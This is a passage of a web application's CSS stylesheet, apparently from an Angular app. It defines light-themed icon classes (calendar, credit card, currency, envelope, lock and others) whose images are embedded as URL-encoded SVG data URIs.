      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_bubble%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M26.22%2C13.89C24.7%2C11%2C21.15%2C9%2C17%2C9%2C11.48%2C9%2C7%2C12.58%2C7%2C17c0%2C3%2C2%2C5.48%2C5%2C6.86v5.41l5.23-2.82a9%2C9%2C0%2C0%2C0%2C1.88%2C1.62l11.14%2C6V28.66c3-1.37%2C5-3.91%2C5-6.86C35.25%2C17.65%2C31.28%2C14.29%2C26.22%2C13.89ZM9%2C17c0-3.31%2C3.58-6%2C8-6s8%2C2.69%2C8%2C6a5.51%2C5.51%2C0%2C0%2C1-2.79%2C4.52L14%2C25.94V22.52C11.08%2C21.63%2C9%2C19.51%2C9%2C17ZM28.25%2C27.32v3.42L20%2C26.32a6.54%2C6.54%2C0%2C0%2C1-1-.83l4.13-2.22A7.51%2C7.51%2C0%2C0%2C0%2C27%2C17a6.44%2C6.44%2C0%2C0%2C0-.13-1c3.63.56%2C6.38%2C2.93%2C6.38%2C5.82C33.25%2C24.31%2C31.17%2C26.43%2C28.25%2C27.32Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-calendar-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_calendar%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C11H27V9H25v2H17V9H15v2H9V27a6%2C6%2C0%2C0%2C0%2C6%2C6H27a6%2C6%2C0%2C0%2C0%2C6-6h0ZM15%2C13v2h2V13h8v2h2V13h4v4H11V13ZM31%2C27a4%2C4%2C0%2C0%2C1-4%2C4H15a4%2C4%2C0%2C0%2C1-4-4V19H31Zm-4.74-6%2C.94%2C1.77-9.65%2C5.09-.94-1.77h0L15%2C22.93%2C16.77%2C22l1.65%2C3.16Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-chart-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_chart%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M17%2C29a4%2C4%2C0%2C0%2C1-4-3.81V23.09l4.94-2.63%2C1.81%2C3.4%2C11.61-6.18-.94-1.77-9.85%2C5.24-1.81-3.39L13%2C20.82V13H11V25.22A6%2C6%2C0%2C0%2C0%2C17%2C31H31V29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-checkmark-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_checkmark%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2231.9%2014.46%2015.3%2023.29%2011.77%2016.64%2010%2017.58%2014.46%2026%2032.84%2016.23%2031.9%2014.46%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-circle-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_circlearrows%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C1%2C1%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31.45%2C26.81a12%2C12%2C0%2C0%2C1-21.16-.27l1.73-1a10%2C10%2C0%2C0%2C0%2C17.66.35l-3.21-1.7%2C7.84-4.9.32%2C9.23ZM26.59%2C10.41a12%2C12%2C0%2C0%2C0-16.16%2C4.85L7.37%2C13.62l.32%2C9.23L15.52%2C18l-3.32-1.77a10%2C10%2C0%2C0%2C1%2C17.67.32l1.73-1A11.94%2C11.94%2C0%2C0%2C0%2C26.59%2C10.41Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-creditCard-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_creditcard%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M21%2C23v2H11V23Zm14-8h0V27a4%2C4%2C0%2C0%2C1-4%2C4H11a4%2C4%2C0%2C0%2C1-4-4V15H7a4%2C4%2C0%2C0%2C1%2C4-4H31a4%2C4%2C0%2C0%2C1%2C4%2C4ZM11%2C29H21.44L33%2C22.85V19H9v8A2%2C2%2C0%2C0%2C0%2C11%2C29Zm22-2V25.12L25.7%2C29H31A2%2C2%2C0%2C0%2C0%2C33%2C27Zm0-12a2%2C2%2C0%2C0%2C0-2-2H11a2%2C2%2C0%2C0%2C0-2%2C2v2H33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-currency-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_currency_bill%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M7%2C13V29H35V13Zm26%2C7.88L24.18%2C25.6A6.48%2C6.48%2C0%2C0%2C0%2C26%2C21c0-3.19-2.08-5.77-4.7-6v0H33ZM9%2C15h7.49L9%2C19Zm12%2C2c1.66%2C0%2C3%2C1.79%2C3%2C4s-1.34%2C4-3%2C4-3-1.79-3-4S19.34%2C17%2C21%2C17ZM9%2C21.22l8.5-4.5A6.61%2C6.61%2C0%2C0%2C0%2C16%2C21c0%2C3.24%2C2.14%2C5.86%2C4.82%2C6v0H9ZM25.84%2C27%2C33%2C23.18V27Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-docuarrow-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_docuarrow%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C9V33H24.13l5.09-2.67A4%2C4%2C0%2C0%2C0%2C31%2C27h0V9ZM27.73%2C28.85l-4%2C2.15H23V27h6A2%2C2%2C0%2C0%2C1%2C27.73%2C28.85ZM21%2C25v6H13V11H29v6H23V14l-7%2C4%2C7%2C4V19h6v6Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-docucheck-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_docucheck%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C9V33H24.14l5.08-2.7h0A4%2C4%2C0%2C0%2C0%2C31%2C27h0V9ZM29%2C27a2%2C2%2C0%2C0%2C1-1.27%2C1.85l-4%2C2.15H23V27Zm0-2H21v6H13V11H29ZM17.53%2C21.84%2C15%2C16.93%2C16.72%2C16l1.65%2C3.15L26.24%2C15l.94%2C1.77Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-document-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_document%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C9V33H24.13l5.08-2.7h0A4%2C4%2C0%2C0%2C0%2C31%2C27h0V9ZM29%2C27a2%2C2%2C0%2C0%2C1-1.27%2C1.85l-4%2C2.15H23V27Zm0-2H21v6H13V11H29ZM27%2C15H15V13H27ZM15%2C19V17h8v2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-dollar-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_dollar%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M22.32%2C34.26H19.79v-3.8a9.09%2C9.09%2C0%2C0%2C1-5.15-2.56l-.18-.19%2C1.74-1.94.21.2a6.7%2C6.7%2C0%2C0%2C0%2C4.72%2C2.14c2.36%2C0%2C3.71-1%2C3.71-2.76%2C0-1.55-.95-2.34-4.23-3.52-3.74-1.34-5.51-2.5-5.51-5.51%2C0-2.6%2C1.75-4.37%2C4.7-4.78V7.74h2.53v3.76a8.53%2C8.53%2C0%2C0%2C1%2C4.62%2C2l.22.17-1.67%2C2-.21-.18A6.17%2C6.17%2C0%2C0%2C0%2C21%2C13.88c-2.14%2C0-3.31.82-3.31%2C2.31%2C0%2C1.27.4%2C2%2C4.2%2C3.33%2C4.25%2C1.53%2C5.54%2C2.87%2C5.54%2C5.72s-2%2C4.79-5.12%2C5.21Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-download-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_download%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C23v2a6%2C6%2C0%2C0%2C1-6%2C6H15a6%2C6%2C0%2C0%2C1-6-6V23h2v2a4%2C4%2C0%2C0%2C0%2C4%2C4H27a4%2C4%2C0%2C0%2C0%2C4-4V23ZM22%2C17V9H20v8H16.38L21%2C25l4.62-8Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-envelop-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_envelope%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C15h0V13H9V25a6%2C6%2C0%2C0%2C0%2C6%2C6H27a6%2C6%2C0%2C0%2C0%2C6-6V15ZM31%2C25a4%2C4%2C0%2C0%2C1-4%2C4H15a4%2C4%2C0%2C0%2C1-4-4h0V19.75l10%2C5.32%2C10-5.27Zm0-7.46L21%2C22.83%2C11%2C17.49V15H31Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-euro-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_euro%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M22%2C31c-3.13%2C0-5.75-3-6.64-7H21V22H15.07c0-.33-.07-.66-.07-1s0-.67.07-1H21V18H15.36c.89-4%2C3.52-7%2C6.64-7a6.26%2C6.26%2C0%2C0%2C1%2C5.09%2C3.16l1.73-.92C27.17%2C10.67%2C24.74%2C9%2C22%2C9c-4.2%2C0-7.71%2C3.83-8.71%2C9H11v2h2c0%2C.33%2C0%2C.66%2C0%2C1s0%2C.67%2C0%2C1H11v2h2.3c1%2C5.17%2C4.52%2C9%2C8.71%2C9%2C2.74%2C0%2C5.16-1.67%2C6.8-4.25l-1.71-.91A6.25%2C6.25%2C0%2C0%2C1%2C22%2C31Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-jbp-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_GBP%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M27.17%2C26.86a4%2C4%2C0%2C0%2C1-3.73%2C2.59%2C3.65%2C3.65%2C0%2C0%2C1-1.54-.37v0L19%2C27.56V21h6V19H19V15h0a4%2C4%2C0%2C0%2C1%2C4-4%2C3.94%2C3.94%2C0%2C0%2C1%2C2.56%2C1l1.88-1A6%2C6%2C0%2C0%2C0%2C17%2C15h0v4H15v2h2v6.29l-4%2C2.13.94%2C1.77%2C3.8-2%2C2.83%2C1.51a5.79%2C5.79%2C0%2C0%2C0%2C.52.28l.37.13a5.83%2C5.83%2C0%2C0%2C0%2C2%2C.38A6%2C6%2C0%2C0%2C0%2C29%2C27.8Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-info-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_info%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M23%2C13a2%2C2%2C0%2C1%2C1-2-2%2C2%2C2%2C0%2C0%2C1%2C2%2C2m12%2C8A14%2C14%2C0%2C1%2C0%2C21%2C35%2C14%2C14%2C0%2C0%2C0%2C35%2C21m2%2C0A16%2C16%2C0%2C1%2C1%2C21%2C5%2C16%2C16%2C0%2C0%2C1%2C37%2C21M23%2C17.09l-4.74%2C2.52.94%2C1.77%2C1.8-1V31h2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-laptop-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_laptop%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31%2C25V11H11V25H7a6%2C6%2C0%2C0%2C0%2C6%2C6H29a6%2C6%2C0%2C0%2C0%2C6-6ZM13%2C13h8.43L13%2C17.48Zm0%2C6.75L25.69%2C13H29V25H13ZM29%2C29H13a4%2C4%2C0%2C0%2C1-3.46-2H32.47A4%2C4%2C0%2C0%2C1%2C29%2C29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-lightbulb-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_lightbulb%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M17%2C29h8v2H17Zm2%2C6h4V33H19Zm6.44-18.14-.94-1.77L21%2C17%2C17.5%2C15.1l-.94%2C1.77L21%2C19.22h0Zm-.44%2C7V27H17V23.87a8%2C8%2C0%2C1%2C1%2C8%2C0ZM27%2C17a6%2C6%2C0%2C1%2C0-8%2C5.63V25h4V22.63A6%2C6%2C0%2C0%2C0%2C27%2C17Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-list-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_list%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M15%2C11H31v2H15Zm0%2C14H31V23H15Zm0%2C6H31V29H15Zm0-12H31V17H15Zm-3-6a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1m0%2C12a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1m0-6a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1m0%2C12a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-lock-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_lock%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M27%2C15V13h0a6%2C6%2C0%2C1%2C0-12%2C0v2H11v2h0v8a6%2C6%2C0%2C0%2C0%2C6%2C6h8a6%2C6%2C0%2C0%2C0%2C6-6V15ZM17%2C13a4%2C4%2C0%2C1%2C1%2C8%2C0h0v2H17ZM29%2C25a4%2C4%2C0%2C0%2C1-4%2C4H17a4%2C4%2C0%2C0%2C1-2.89-1.23L29%2C19.88Zm0-7.39L13.14%2C26A3.87%2C3.87%2C0%2C0%2C1%2C13%2C25V17H29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-mapping-light[_ngcontent-yta-c101] {
